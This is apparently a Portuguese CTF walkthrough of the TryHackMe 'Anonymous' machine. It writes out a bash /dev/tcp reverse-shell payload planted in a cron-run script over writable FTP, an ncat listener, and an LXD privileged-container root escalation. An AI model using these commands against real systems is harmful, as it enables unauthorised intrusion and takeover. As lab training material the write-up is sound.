# 🛡️ Anonymous CTF - TryHackMe

**Autor:** Nanoxsec  
---

## 🔍 Reconhecimento

### 🚀 Rustscan

Resultado:

<img width="1262" height="350" alt="Captura de ecrã de 2026-03-11 22-41-39" src="https://github.com/user-attachments/assets/6541c2f6-5fd0-40fb-af7a-488ecccdba71" />


→ Foram identificadas **4 portas abertas**.

---

### 🔎 Nmap (detecção de versões + scripts)

<img width="1317" height="938" alt="Captura de ecrã de 2026-03-11 22-42-10" src="https://github.com/user-attachments/assets/708e83dd-8e1a-4a38-982b-d4e917767af6" />


→ Destaque importante:

- Serviço **FTP com login default habilitado**
  - **Username:** ftp
  - **Password:** ftp
  - **Permissão:** Escrita ✅

---

## 📂 Acesso FTP

<img width="912" height="500" alt="Captura de ecrã de 2026-03-11 23-04-39" src="https://github.com/user-attachments/assets/2de21ae5-d54c-4a83-80a7-c22b01ac0097" />

→ Diretório encontrado:

scripts/
  - clean.sh
  - removed_files.log
  - to_do.txt


---

## ⚙️ Análise do Script `clean.sh`

<img width="1042" height="222" alt="Captura de ecrã de 2026-03-11 23-07-08" src="https://github.com/user-attachments/assets/dc772b23-04d6-4aaa-a152-2dcf31950d0e" />

### 🔍 Problemas identificados:

- Variável `tmp_files` definida como `0`
- Estrutura `if` incorreta
- Script **nunca remove arquivos**
- Apenas escreve no log que não há arquivos

💡 Insight:
> Possível execução automática (CRON)

---

## 💥 Exploração

Como o FTP permite escrita e o script está no diretório:

👉 Modifiquei o `clean.sh` adicionando uma **reverse shell**

### Payload utilizado:

```bash
bash -i >& /dev/tcp/192.168.200.114/1337 0>&1
```

### arquivo clean.sh modificado:

<img width="1038" height="283" alt="Captura de ecrã de 2026-03-11 23-14-22" src="https://github.com/user-attachments/assets/24d1955a-aa31-420f-9766-db3773775aa3" />

### Upload para o servidor, já que tenho permissão de escrita:
<img width="1875" height="657" alt="Captura de ecrã de 2026-03-11 23-20-04" src="https://github.com/user-attachments/assets/564698a5-c15e-4a49-bf98-ceda88499a5a" />

### Arquivo já está no servidor, e enquanto isso eu fui abrir a porta com ncat para receber a conexão:

```bash
ncat -vnlp 1337
```

### Assim que o arquivo foi executado dentro do servidor eu ganhei conexão com o servidor:

<img width="909" height="271" alt="Captura de ecrã de 2026-03-11 23-22-38" src="https://github.com/user-attachments/assets/a50aa798-dd4e-4bce-a54c-508574c65bd1" />

### 🏁 Captura da primeira flag

- Local: /home/namelessone

### Escalando privilégio para root:

🔍 Verificação de SUID

<img width="1270" height="820" alt="Captura de ecrã de 2026-03-11 23-28-58" src="https://github.com/user-attachments/assets/ef1fb647-f4bc-4fc8-9ef1-4517692d8035" />

- Binário interessante: /usr/bin/env



- Tentativa de execução: /usr/bin/env /bin/sh --> falhou

<img width="757" height="188" alt="Captura de ecrã de 2026-03-11 23-33-09" src="https://github.com/user-attachments/assets/d4a1e978-a728-4684-bc0c-9ba74a2a37c6" />


### 🔎 Enumeração adicional para buscar senhas ou arquivos relevantes:

/var/backups → nada relevante

/etc/crontab → nada útil



### 🧬 Descoberta importante

Verificando grupos:
  - 💡 Usuário pertence ao grupo: lxd
  - 💡 Isso permite escalar privilégios montando o sistema root em container

<img width="1124" height="172" alt="Captura de ecrã de 2026-03-11 23-36-42" src="https://github.com/user-attachments/assets/cc7d3259-2429-4afd-8b0f-a52ac6a09ce1" />

### 🚀 Exploração via LXD

📡 Servidor HTTP (máquina atacante)

```bash
sudo python3 -m http.server 80
```

### 📥 Download da imagem no alvo

```bash
wget http://192.168.200.114/alpine-v3.23-x86_64-20260302_0820.tar.gz
```

Link do github da imagem: https://github.com/saghul/lxd-alpine-builder

### ⚙️ Configuração do container dentro do servidor:

```bash
lxc image import alpine-v3.23-x86_64-20260302_0820.tar.gz --alias alpine-v3.3

lxc init

# respostas:
# no
# yes
# default
# dir

dê enter nas pŕoximas e prossiga:

lxc init alpine-v3.3 priviesc -c security.privileged=true

lxc config device add priviesc host-root disk source=/ path=/mnt/root recursive=true

lxc start priviesc

lxd init --auto

lxc exec priviesc /bin/sh
```

### 👑 Root Access
✅ Acesso root obtido

Pegando a flag de root em:
> /mnt/root/root/root.txt


### 🎯 Conclusão

✔️ Exploração via FTP com escrita

✔️ Execução de código via script (possível CRON)

✔️ Reverse shell obtida

✔️ Escalação de privilégio via LXD


<img width="1409" height="410" alt="Captura de ecrã de 2026-03-11 23-58-54" src="https://github.com/user-attachments/assets/2c5f3701-142c-477a-999b-1407fdb9c8a2" />

